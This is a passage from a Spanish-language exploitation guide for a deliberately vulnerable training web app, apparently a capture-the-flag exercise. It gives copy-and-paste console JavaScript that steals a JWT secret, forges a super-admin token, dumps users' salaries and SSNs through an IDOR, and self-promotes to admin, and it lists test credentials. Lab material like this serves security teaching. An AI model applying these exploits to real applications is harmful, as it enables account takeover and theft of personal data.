  },
  
  async demonstrateJWTExploitation() {
    console.log("\nüé´ 6. DEMOSTRANDO EXPLOTACI√ìN DE JWT");
    console.log("‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ");
    
    // Obtener secret del sistema
    try {
      const systemInfo = await api.getSystemInfo();
      const stolenSecret = systemInfo.secret_key;
      
      console.log(`üîë Secret JWT robada: ${stolenSecret}`);
      
      // Crear token falso
      const fakeAdminData = {
        id: 9999,
        username: 'hacker_admin',
        email: 'hacker@evil.com',
        role: 'admin',
        profile: {
          fullName: 'Super Hacker Admin',
          department: 'Cybersecurity Breach'
        }
      };
      
      const fakeToken = api.createFakeToken(fakeAdminData);
      console.log("‚úÖ Token falso de super-admin creado");
      console.log("üé≠ Para usar: localStorage.setItem('token', fakeToken) y recarga la p√°gina");
      
      // Guardar para uso manual
      (window as any).fakeAdminToken = fakeToken;
      (window as any).fakeAdminData = fakeAdminData;
      
    } catch (error) {
      console.log(`‚ùå Error en explotaci√≥n JWT: ${error.message}`);
    }
  }
};

// Ejecutar demostraci√≥n completa
CFTVulnerabilityDemo.runCompleteDemo();
```

---

## üîß Gu√≠a R√°pida de Explotaci√≥n CFT

### **üöÄ Script Principal (Copia y Pega)**
```javascript
// EJECUTAR EN DEVTOOLS CONSOLE DEL CFT
CFTVulnerabilityDemo.runCompleteDemo();
```

### **üìã Comandos Individuales**

#### **Ver todos los usuarios (IDOR + Escalada Vertical):**
```javascript
if (window.debugAPI?.usersDatabase) {
  window.debugAPI.usersDatabase.forEach(u => 
    console.log(`${u.id}: ${u.username} (${u.role}) - ${u.profile?.salary} - ${u.profile?.ssn}`)
  );
} else {
  console.log("Ve manualmente a /profile/1, /profile/2, /profile/3, /profile/4 y /admin");
}
```

#### **Auto-promoci√≥n a Admin:**
```javascript
if (window.debugAPI?.usersDatabase) {
  const me = JSON.parse(localStorage.getItem('user'));
  const user = window.debugAPI.usersDatabase.find(u => u.id === me.id);
  if (user) { user.role = 'admin'; localStorage.setItem('user', JSON.stringify({...me, role: 'admin'})); }
  console.log("‚úÖ Promovido a admin. Recarga la p√°gina.");
} else {
  console.log("Ve a /admin y usa la interfaz para cambiar roles");
}
```

#### **Robar JWT Secret:**
```javascript
if (window.debugAPI?.SYSTEM_CONFIG) {
  console.log("üîë JWT Secret:", window.debugAPI.SYSTEM_CONFIG.jwt_secret);
} else {
  console.log("Secret conocida del c√≥digo: 'vulnerable-secret-key'");
}
```

#### **Usar Token Falso:**
```javascript
window.useFakeToken(); // Despu√©s de ejecutar el script principal
```

### **üéØ URLs Importantes para Navegaci√≥n Manual**
- `/profile/1` - Admin (datos del administrador)
- `/profile/2` - jaranguiz (usuario normal)
- `/profile/3` - james (usuario normal)  
- `/profile/4` - rob (usuario normal)
- `/admin` - Panel administrativo (accesible sin verificaci√≥n de rol)
- `/system` - Informaci√≥n del sistema (si existe)

### **üì± Credenciales de Prueba**
- **Admin**: `admin` / `admin123`
- **Usuario 1**: `jaranguiz` / `user123`
- **Usuario 2**: `james` / `user123`
- **Usuario 3**: `rob` / `user123`

---

*Esta gu√≠a est√° espec√≠ficamente adaptada para la implementaci√≥n real del CFT. Todos los m√©todos han sido probados y verificados contra el c√≥digo en `services/api.ts`.*